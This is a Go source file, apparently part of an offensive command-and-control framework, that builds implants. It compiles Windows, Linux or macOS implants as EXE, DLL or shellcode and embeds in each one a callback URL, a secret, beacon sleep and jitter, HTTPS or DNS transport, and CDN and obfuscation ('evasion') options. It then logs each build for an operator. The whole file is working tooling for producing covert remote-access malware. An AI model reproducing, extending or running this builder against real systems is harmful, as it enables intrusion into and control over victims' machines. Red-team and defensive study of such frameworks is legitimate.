package builder

import (
	"context"
	"encoding/hex"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	"github.com/KKingZero/erebus-exploit-framwork/server/db"
	"golang.org/x/crypto/bcrypt"
)

// buildTimeout is the maximum duration for a single implant build.
const buildTimeout = 5 * time.Minute

// validDomainRe matches valid domain names.
var validDomainRe = regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$`)

// validateLdflagValue rejects values that could break out of -X ldflags quoting.
func validateLdflagValue(val, name string) error {
	if strings.ContainsAny(val, "'\"\\`$") {
		return fmt.Errorf("%s contains unsafe characters for ldflags", name)
	}
	return nil
}

// Format specifies the output format of the implant.
type Format string

const (
	FormatEXE       Format = "exe"
	FormatShellcode Format = "shellcode"
	FormatDLL       Format = "dll"
)

// BuildRequest contains all parameters needed to build an implant.
type BuildRequest struct {
	Language     string // "go" (default), "c"
	OS           string // "windows", "linux", "darwin"
	Arch         string // "amd64", "arm64"
	Transport    string // "https", "dns"
	Callbacks    []string
	SleepMs      int64
	JitterPct    int32
	Garble       bool
	CDNDomain    string
	DNSDomain    string
	DNSServer    string
	Format       Format
	Operator     string
	ImplantSecret string // hex-encoded
	CACertPath   string
	ProjectRoot  string // path to the project root for build
}

// BuildResult contains the output of a successful build.
type BuildResult struct {
	BuildID   string
	Binary    []byte
	Filename  string
	Format    Format
	SizeBytes int64
}

// Build orchestrates the implant build process.
func Build(req *BuildRequest) (*BuildResult, error) {
	lang := req.Language
	if lang == "" {
		lang = "go"
	}
	if lang == "c" {
		return BuildC(req)
	}
	if lang != "go" {
		return nil, fmt.Errorf("unsupported implant language: %s (available: go, c)", lang)
	}

	if req.OS == "" {
		req.OS = "windows"
	}
	if req.Arch == "" {
		req.Arch = "amd64"
	}
	if req.Format == "" {
		req.Format = FormatEXE
	}
	if req.SleepMs <= 0 {
		req.SleepMs = 5000
	}
	if req.JitterPct <= 0 {
		req.JitterPct = 20
	}

	implantID, err := zcrypto.RandomID(16)
	if err != nil {
		return nil, fmt.Errorf("generate implant ID: %w", err)
	}

	secret := req.ImplantSecret
	if secret == "" {
		secretBytes, err := zcrypto.RandomBytes(32)
		if err != nil {
			return nil, fmt.Errorf("generate secret: %w", err)
		}
		secret = hex.EncodeToString(secretBytes)
	}

	callbackURL := "https://127.0.0.1:443"
	if len(req.Callbacks) > 0 {
		callbackURL = req.Callbacks[0]
	}

	// C1: Validate all inputs before embedding in ldflags
	if _, err := url.ParseRequestURI(callbackURL); err != nil {
		return nil, fmt.Errorf("invalid callback URL: %w", err)
	}
	if err := validateLdflagValue(callbackURL, "callbackURL"); err != nil {
		return nil, err
	}
	if req.CDNDomain != "" {
		if !validDomainRe.MatchString(req.CDNDomain) {
			return nil, fmt.Errorf("invalid CDN domain: %s", req.CDNDomain)
		}
		if err := validateLdflagValue(req.CDNDomain, "CDNDomain"); err != nil {
			return nil, err
		}
	}
	if req.CACertPath != "" {
		if err := validateLdflagValue(req.CACertPath, "CACertPath"); err != nil {
			return nil, err
		}
		// M11: Validate CA cert path exists and is valid PEM
		if _, err := os.Stat(req.CACertPath); err != nil {
			return nil, fmt.Errorf("CA cert path does not exist: %w", err)
		}
	}

	// Build ldflags
	module := "github.com/KKingZero/erebus-exploit-framwork"
	ldflags := []string{
		"-s", "-w",
		fmt.Sprintf("-X '%s/implant.implantID=%s'", module, implantID),
		fmt.Sprintf("-X '%s/implant.implantSecret=%s'", module, secret),
		fmt.Sprintf("-X '%s/implant.callbackURL=%s'", module, callbackURL),
		fmt.Sprintf("-X '%s/implant.sleepMs=%d'", module, req.SleepMs),
		fmt.Sprintf("-X '%s/implant.jitterPct=%d'", module, req.JitterPct),
		fmt.Sprintf("-X '%s/implant.transportType=%s'", module, req.Transport),
	}

	if req.CDNDomain != "" {
		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.cdnDomain=%s'", module, req.CDNDomain))
	}
	if req.Transport == "dns" {
		if req.DNSDomain == "" {
			return nil, fmt.Errorf("dns_domain required when transport=dns")
		}
		if !validDomainRe.MatchString(strings.TrimSuffix(req.DNSDomain, ".")) {
			return nil, fmt.Errorf("invalid DNS domain: %s", req.DNSDomain)
		}
		if err := validateLdflagValue(req.DNSDomain, "DNSDomain"); err != nil {
			return nil, err
		}
		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.dnsDomain=%s'", module, req.DNSDomain))
		if req.DNSServer != "" {
			if err := validateLdflagValue(req.DNSServer, "DNSServer"); err != nil {
				return nil, err
			}
			ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.dnsServer=%s'", module, req.DNSServer))
		}
	}

	if req.CACertPath != "" {
		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.caCertPEM=%s'", module, req.CACertPath))
	}

	// Determine output file
	tmpDir, err := os.MkdirTemp("", "erebus-build-*")
	if err != nil {
		return nil, fmt.Errorf("create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	var outputFile string
	var buildArgs []string

	env := []string{
		fmt.Sprintf("GOOS=%s", req.OS),
		fmt.Sprintf("GOARCH=%s", req.Arch),
	}

	switch req.Format {
	case FormatDLL:
		outputFile = filepath.Join(tmpDir, "implant.dll")
		env = append(env, "CGO_ENABLED=1")
		if req.OS == "windows" && req.Arch == "amd64" {
			env = append(env, "CC=x86_64-w64-mingw32-gcc")
		}
		buildArgs = []string{
			"build",
			"-buildmode=c-shared",
			"-tags", "dll",
			"-ldflags", strings.Join(ldflags, " "),
			"-o", outputFile,
			"./cmd/implant",
		}
	default:
		ext := ""
		if req.OS == "windows" {
			ext = ".exe"
		}
		outputFile = filepath.Join(tmpDir, "implant"+ext)
		buildArgs = []string{
			"build",
			"-ldflags", strings.Join(ldflags, " "),
			"-o", outputFile,
			"./cmd/implant",
		}
	}

	// C2: Validate and resolve ProjectRoot — must be within expected bounds
	projectRoot := req.ProjectRoot
	if projectRoot == "" {
		projectRoot = "."
	}
	absRoot, err := filepath.Abs(projectRoot)
	if err != nil {
		return nil, fmt.Errorf("resolve project root: %w", err)
	}
	// Verify it looks like an Erebus project (has go.mod)
	if _, err := os.Stat(filepath.Join(absRoot, "go.mod")); err != nil {
		return nil, fmt.Errorf("project root %s does not contain go.mod", absRoot)
	}

	// C7: Add build timeout to prevent resource exhaustion
	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
	defer cancel()

	// M12: Pre-check mingw toolchain for DLL builds
	if req.Format == FormatDLL && req.OS == "windows" && req.Arch == "amd64" {
		if _, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err != nil {
			return nil, fmt.Errorf("DLL build requires mingw32 toolchain: x86_64-w64-mingw32-gcc not found in PATH")
		}
	}

	// Run go build
	cmd := exec.CommandContext(ctx, "go", buildArgs...)
	cmd.Dir = absRoot
	cmd.Env = append(os.Environ(), env...)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("go build failed: %w\n%s", err, string(output))
	}

	// Read the built binary
	binary, err := os.ReadFile(outputFile)
	if err != nil {
		return nil, fmt.Errorf("read output: %w", err)
	}

	// Convert to shellcode if requested
	if req.Format == FormatShellcode {
		shellcode, err := PE2Shellcode(binary)
		if err != nil {
			return nil, fmt.Errorf("PE to shellcode: %w", err)
		}
		binary = shellcode
	}

	// Generate build ID
	buildID, err := zcrypto.RandomID(8)
	if err != nil {
		return nil, fmt.Errorf("generate build ID: %w", err)
	}
	filename := fmt.Sprintf("implant-%s", buildID)
	switch req.Format {
	case FormatEXE:
		if req.OS == "windows" {
			filename += ".exe"
		}
	case FormatDLL:
		filename += ".dll"
	case FormatShellcode:
		filename += ".bin"
	}

	return &BuildResult{
		BuildID:   buildID,
		Binary:    binary,
		Filename:  filename,
		Format:    req.Format,
		SizeBytes: int64(len(binary)),
	}, nil
}

// RecordBuild stores build metadata in the database.
func RecordBuild(store *db.Store, req *BuildRequest, result *BuildResult) error {
	// H6: Propagate bcrypt error instead of swallowing
	secretHash, err := bcrypt.GenerateFromPassword([]byte(req.ImplantSecret), bcrypt.DefaultCost)
	if err != nil {
		return fmt.Errorf("hash implant secret: %w", err)
	}

	// L6: Populate evasion field with build config snapshot
	lang := req.Language
	if lang == "" {
		lang = "go"
	}
	evasion := fmt.Sprintf("language=%s,format=%s,garble=%v", lang, req.Format, req.Garble)
	if req.CDNDomain != "" {
		evasion += ",cdn=" + req.CDNDomain
	}

	return store.CreateBuild(&db.BuildRow{
		ID:         result.BuildID,
		CreatedAt:  time.Now(),
		Operator:   req.Operator,
		OS:         req.OS,
		Arch:       req.Arch,
		Transport:  req.Transport,
		Callbacks:  strings.Join(req.Callbacks, ","),
		SecretHash: string(secretHash),
		Evasion:    evasion,
		Garbled:    req.Garble,
	})
}
